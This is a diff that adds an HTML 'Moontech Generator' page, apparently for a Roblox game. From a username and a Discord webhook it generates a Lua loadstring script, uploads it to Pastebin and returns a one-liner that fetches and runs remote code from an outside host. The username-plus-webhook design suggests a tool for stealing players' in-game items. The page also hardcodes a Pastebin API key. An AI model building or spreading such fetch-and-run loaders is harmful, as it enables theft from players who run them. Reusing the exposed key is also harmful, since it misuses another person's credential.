@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://example.com/path/to/your/icon.png" type="image/png"> <!-- Replace with your icon link -->
+  <title>Moontech - Psx</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      text-align: center;
+    }
+
+    h1 {
+      color: #333;
+    }
+
+    label {
+      font-size: 14px;
+      color: #555;
+    }
+
+    input[type="text"], input[type="url"], textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    textarea {
+      height: 150px;
+    }
+
+    button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    .embed {
+      background-color: #eef;
+      padding: 15px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+    }
+
+    #status {
+      color: #4CAF50;
+      font-size: 14px;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Moontech Generator</h1>
+    
+    <div class="embed">
+      <h2>Webbased Generate Script</h2>
+      <p>Moontech Invite: <a href="https://discord.gg/RsMKm4ZWGd" target="_blank">Join our Discord</a></p>
+    </div>
+    
+    <form id="scriptForm">
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username" required><br><br>
+
+      <label for="webhook">Webhook (Required):</label>
+      <input type="url" id="webhook" name="webhook" required><br><br>
+
+      <button type="button" id="generateBtn">Generate</button>
+      <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br>
+
+      <button type="button" id="copyBtn">Copy to Clipboard</button>
+    </form>
+
+    <div id="status"></div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      const generateButton = document.getElementById('generateBtn');
+      const copyButton = document.getElementById('copyBtn');
+      const status = document.getElementById('status');
+
+      generateButton.addEventListener('click', function(event) {
+        event.preventDefault();
+
+        const username = document.getElementById("username").value;
+        const webhook = document.getElementById("webhook").value;
+
+        const scriptContent = `Username = "${username}"\n` +
+                              `Webhook = "${webhook}"\n\n` +
+                              `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/mainloader.lua", true))()`;
+
+        // Send to Pastebin
+        const pasteData = {
+          api_dev_key: 'fw1TP2aocJeX4p3DnYmXs23OiKS4LdTu
+', // Replace with your API key
+          api_option: 'paste',
+          api_paste_code: scriptContent,
+          api_paste_private: '2', // 0=public, 1=unlisted, 2=private
+          api_paste_name: 'Moontech Generated Script',
+          api_paste_expire_date: 'N', // N = Never
+        };
+
+        const formData = new URLSearchParams(pasteData);
+
+        fetch('https://pastebin.com/api/api_post.php', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: formData,
+        })
+        .then(response => response.text())
+        .then(pastebinUrl => {
+          // Check if response contains the URL (Pastebin returns the URL on success)
+          if (pastebinUrl.startsWith('http')) {
+            // Insert Pastebin link in the loadstring
+            const finalScript = `loadstring(game:HttpGet("${pastebinUrl}", true))()`;
+            document.getElementById("output").value = finalScript;
+            status.textContent = "Script generated and uploaded successfully!";
+          } else {
+            status.textContent = "Failed to upload to Pastebin: " + pastebinUrl;
+          }
+        })
+        .catch(error => {
+          status.textContent = "Failed to upload to Pastebin.";
+          console.error('Error:', error);
+        });
+      });
+
+      copyButton.addEventListener('click', function() {
+        const copyText = document.getElementById("output");
+        copyText.select();
+        copyText.setSelectionRange(0, 99999);
+        document.execCommand("copy");
+        alert("Copied to clipboard!");
+      });
+    });
+  </script>
+</body>
+</html>
